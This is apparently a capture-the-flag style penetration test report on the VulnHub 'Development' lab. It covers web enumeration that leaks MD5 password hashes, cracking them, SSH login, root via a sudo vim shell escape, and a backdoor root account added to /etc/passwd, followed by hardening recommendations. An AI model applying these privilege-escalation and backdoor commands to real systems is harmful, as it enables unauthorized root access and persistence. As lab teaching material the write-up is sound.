# Penetration Test Report: Development (VulnHub)

**Date:** December 16, 2025
**Target IP:** 192.168.56.107
**Attacker IP:** 192.168.56.102
**Security Level:** Critical

-----

## 1\. Executive Summary

The "Development" machine was subjected to a black-box penetration test. The assessment identified critical vulnerabilities resulting in full system compromise (Root Access).

The initial entry point was identified through **Information Disclosure** within the web application, which leaked user credentials and password hashes. After cracking these hashes, access was gained via SSH. Privilege escalation was achieved due to a **Security Misconfiguration in Sudo rights**, allowing the execution of text editors (`vim` and `nano`) with root privileges.

**Note on Environment:** The target machine required manual intervention (Recovery Mode) to fix a misconfigured SSH daemon to allow legitimate login attempts, reflecting the "broken" nature of this specific lab.

-----

## 2\. Reconnaissance & Enumeration

### 2.1. Network Scanning (Nmap)

A full port scan revealed the following open ports:

  * **22/tcp:** SSH (OpenSSH 7.6p1)
  * **8080/tcp:** HTTP (Apache, masquerading as IIS 6.0)
  * **139/445 tcp:** SMB (Samba)
  * **2222/tcp:** SSH (Alternate port)

### 2.2. Web Enumeration (Port 8080)

The web server presented a "Development Portal." Source code analysis and directory fuzzing revealed sensitive information.

  * **Email addresses found:** `patrick@goodtech.com.sg`
  * **Hidden comments:** References to legacy systems.
  * **Information Leakage:** A file named `dev.txt` (or similar internal documentation found via web enumeration) contained a list of usernames and MD5 hashes:
      * `admin`: `3cb1d13bb83ffff2defe8d1443d3a0eb`
      * `intern`: `4a8a2b374f463b7aedbb44a066363b81`
      * `patrick`: `87e6d56ce79af90dbe07d387d3d0579e`
      * `qiu`: `ee64497098d0926d198f54f6d5431f98`

-----

## 3\. Vulnerability Analysis & Exploitation

### 3.1. Password Cracking (Hashcat)

Using `hashcat` with Mode 0 (MD5) and the `rockyou.txt` wordlist, we analyzed the leaked hashes.

**1. Intern User:**

  * **Hash:** `4a8a2b374f463b7aedbb44a066363b81`
  * **Result:** `patrick`
  * **Observation:** The user `intern` uses the password `patrick`.

**2. Patrick User:**

  * **Hash:** `87e6d56ce79af90dbe07d387d3d0579e`
  * **Methodology:** A custom python script (`pass.py`) was created to generate a wordlist based on the pattern `P@ssw0rd` followed by numbers 0-100, as hinted by internal files/logic.
  * **Result:** `P@ssw0rd25`

### 3.2. Access Phase (SSH)

Attempts to login via SSH revealed two distinct environments:

1.  **User `intern` (Restricted):**

      * Login: `ssh intern@192.168.56.107`
      * **Result:** Access granted but confined to a **Restricted Shell (lshell)**. Commands were severely limited (`ls`, `echo`, `lpath`). Attempts to break out using `os.system` via `echo` or accessing `/bin/bash` failed due to strict syntax checking.

2.  **User `patrick` (Broken Config):**

      * Initial attempts to login as `patrick` failed ("Permission Denied"), despite having the correct password.
      * **Lab Fix:** Analysis revealed the machine's `/etc/ssh/sshd_config` did not whitelist `patrick`. We booted the VM into **Recovery Mode** (`init=/bin/bash`), mounted the filesystem as Read/Write, and edited `sshd_config` to add:
        `AllowUsers admin intern patrick`
      * After restarting the SSH service, login was successful:
        `ssh patrick@192.168.56.107` (Password: `P@ssw0rd25`)

-----

## 4\. Privilege Escalation (Root)

Once authenticated as `patrick`, we checked for sudo privileges:

```bash
sudo -l
```

**Output:**

```text
User patrick may run the following commands on development:
    (ALL) NOPASSWD: /usr/bin/vim
    (ALL) NOPASSWD: /bin/nano
```

This configuration allows the user to run text editors as root without a password. This is a critical vulnerability (GTFOBins). We exploited this in two ways:

### Method A: Shell Escape via Vim

We launched Vim with sudo and invoked a shell:

```bash
sudo vim -c ':!/bin/bash'
```

**Result:** Immediate `root` shell access.

### Method B: Persistence via /etc/passwd (Nano)

We used Nano to modify the system's user database directly to create a backdoor.

1.  **Generate Hash:** Created a password hash for a new root user.
    ```bash
    openssl passwd -1 -salt salt password
    # Output: $1$salt$qJH7.N4xYta3aEG/dfqo/0
    ```
2.  **Edit /etc/passwd:**
    ```bash
    sudo nano /etc/passwd
    ```
3.  **Inject User:** Added the user `haha` with UID `0` (Root) and GID `0`.
    `haha:$1$salt$qJH7.N4xYta3aEG/dfqo/0:0:0:root:/root:/bin/bash`
4.  **Exploit:**
    ```bash
    su haha
    # Password: password
    ```

**Result:** Logged in as `root` (uid=0).

-----

## 5\. Conclusion & Recommendations

The "Development" machine demonstrates how information leakage combined with poor configuration management can lead to total system compromise.

**Key Recommendations:**

1.  **Remove Sensitive Files:** Ensure debugging files containing hashes (`dev.txt`) are removed from the web root.
2.  **Sudo Hardening:** Never allow text editors (`vim`, `nano`, `less`) to run as `root` via sudo without password, or use `sudoedit` instead to prevent shell escapes.
3.  **Password Policy:** Enforce stronger passwords that cannot be easily generated via simple dictionary attacks.

**Walkthrough Note:** As noted by the lab author, this machine is intentionally "buggy." The requirement to fix the `sshd_config` manually in recovery mode serves as a lesson in troubleshooting Linux systems and understanding that in real-world scenarios (or broken CTFs), services may fail and require administrative intervention to proceed.